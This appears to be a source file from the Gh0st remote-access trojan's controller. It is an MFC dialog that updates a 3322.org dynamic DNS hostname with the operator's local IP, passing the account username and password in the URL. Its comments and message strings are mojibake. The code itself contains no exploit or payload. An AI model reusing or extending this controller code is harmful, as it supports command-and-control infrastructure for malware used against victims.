// Ip3322Dlg.cpp : implementation file
//

#include "stdafx.h"
#include "gh0st.h"
#include "Ip3322Dlg.h"
#include <winsock2.h>
#include <wininet.h>

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CIp3322Dlg dialog


CIp3322Dlg::CIp3322Dlg(CWnd* pParent /*=NULL*/)
	: CDialog(CIp3322Dlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CIp3322Dlg)
	m_strname = _T("***");
	m_strym = _T("***.3322.org");
	m_strpass = _T("***");
	//}}AFX_DATA_INIT
}


void CIp3322Dlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CIp3322Dlg)
	DDX_Control(pDX, IDC_COMBO2, m_cmbIP);
	DDX_Control(pDX, IDC_ym, m_editym);
	DDX_Control(pDX, IDC_name, m_editname);
	DDX_Text(pDX, IDC_name, m_strname);
	DDX_Text(pDX, IDC_ym, m_strym);
	DDX_Text(pDX, IDC_PASS, m_strpass);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CIp3322Dlg, CDialog)
	//{{AFX_MSG_MAP(CIp3322Dlg)
	ON_BN_CLICKED(IDC_BUTTON2, OnButton2)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()


BOOL CIp3322Dlg::OnInitDialog()
{

	CDialog::OnInitDialog();
	// TODO: Add extra initialization here
//	SetIcon(m_hIcon, TRUE);			// Set big icon
//	SetIcon(m_hIcon, FALSE);		// Set small icon
//	InitComboBox();
  
	InitLocalIP();
//	mr();
//	ChangeSkin(m_pClientDlg->m_emSkinType);
	
	return TRUE;  // return TRUE unless you set the focus to a control
	              // EXCEPTION: OCX Property Pages should return FALSE
}



/////////////////////////////////////////////////////////////////////////////
// CIp3322Dlg message handlers

BOOL CIp3322Dlg::InitLocalIP()
{
	char szHostName[MAX_PATH];
	memset(szHostName,0,MAX_PATH);
	if(gethostname(szHostName,MAX_PATH) == SOCKET_ERROR)
		return FALSE;

	struct sockaddr_in dest;
	struct hostent *hostInfo;

	
	if((hostInfo = gethostbyname(szHostName)) != NULL)
	{
		for(int nIndex = 0; hostInfo->h_addr_list[nIndex] != NULL ;nIndex ++)
		{
            memcpy(&(dest.sin_addr), hostInfo->h_addr_list[nIndex],	hostInfo->h_length);
			m_cmbIP.AddString(inet_ntoa(dest.sin_addr));

		}
	}

	m_cmbIP.AddString("0.0.0.0");
	m_cmbIP.SetCurSel(1);


	return FALSE;
}



BOOL CIp3322Dlg::InitComboBox()
{
	return TRUE;
}




void CIp3322Dlg::OnButton2() 
{
	// TODO: Add your control notification handler code here
	UpdateData();
	
	CString strUpdate,strLocalIP;
	m_cmbIP.GetLBText(m_cmbIP.GetCurSel(),strLocalIP);

	strUpdate.Format("http://%s:%s@members.3322.org/dyndns/update?system=dyndns&hostname=%s&myip=%s&wildcard=OFF",
						m_strname,m_strpass,m_strym,strLocalIP);
	
	HINTERNET hNet = ::InternetOpen("3322",							// ��HTTP��ĳ�ϥήɡA�o�ӰѼ��H�N��� 
									PRE_CONFIG_INTERNET_ACCESS,		// �X����������Win32������ƨϥεn�O�H���h�o�{�@�ӪA�Ⱦ��C 
									NULL, 
									INTERNET_INVALID_PORT_NUMBER,	// �ϥ�INTERNET_INVALID_PORT_NUMBER�۷�󴣨ѫo�٪��ݤf�ơC 
									0								// �лx�h���ܨϥΪ�^�y�y�`���N�Ӫ�Internet��ƱN"��"���^�ը�Ƶo�e���A�H�� 
									) ; 
	
	HINTERNET hUrlFile = ::InternetOpenUrl(hNet,					// �qInternetOpen��^���y�` 
									(char *)strUpdate.GetBuffer(MAX_PATH),	// �ݭn���}��URL 
									NULL,							// �ΨӦV�A�Ⱦ��ǰe�B�~���H��,�@�묰NULL 
									0,								// �ΨӦV�A�Ⱦ��ǰe�B�~���H��,�@�묰 0 
									INTERNET_FLAG_RELOAD,			// InternetOpenUrl�欰���лx 
									0) ;							// �H���N���|�Q�e�쪬�A�^�ը�� 
	
	CString strMsg; 
	DWORD dwBytesRead = 0; 
	BOOL bRead = ::InternetReadFile(hUrlFile,						// InternetOpenUrl��^���y�` 
									strMsg.GetBuffer(MAX_PATH),		// �O�d�ƾڪ��w�İ� 
									MAX_PATH, 
									&dwBytesRead);					// ���V�]�tŪ�J�w�İϦr�`�ƪ��ܶq�����w; 

	//�p�G��^�ȬOTRUE�A�ӥB�o�̫��V0�A�h���w�gŪ��F��󪺥����C 
	
	::InternetCloseHandle(hUrlFile); 
	::InternetCloseHandle(hNet); 
	
    if(strMsg.Find("badauth") != -1)
	{
		::MessageBox(NULL,"ID��PASS���~","��s�ʺA��W",MB_ICONEXCLAMATION | MB_OK);
	}
	else if(strMsg.Find("nohost") != -1)
	{
		::MessageBox(NULL,"DDNS���~\n���ˬd�O�_��J���T","��s�ʺA��W",MB_ICONEXCLAMATION | MB_OK);
	}
	else if(strMsg.Find("good") != -1)
	{
		::MessageBox(NULL,"��s�ʺA��W���\\r","��s�ʺA��W",MB_OK);
	}
	else if(strMsg.Find("!yours") != -1)
	{
		::MessageBox(NULL,"�T�w����W�O�A���H\r","��s�ʺA��W",MB_OK);
	}
	else if(strMsg.Find("nochg") != -1)
	{
		::MessageBox(NULL,"�Ф��n���Ч�s\r","��s�ʺA��W",MB_OK);
	}
	else 
	{
		::MessageBox(NULL,"�ʺA��W�A�Ⱦ��������~,�еy�ԦA��","��s�ʺA��W",MB_ICONEXCLAMATION | MB_OK);		
	}

	strMsg.ReleaseBuffer();	
}


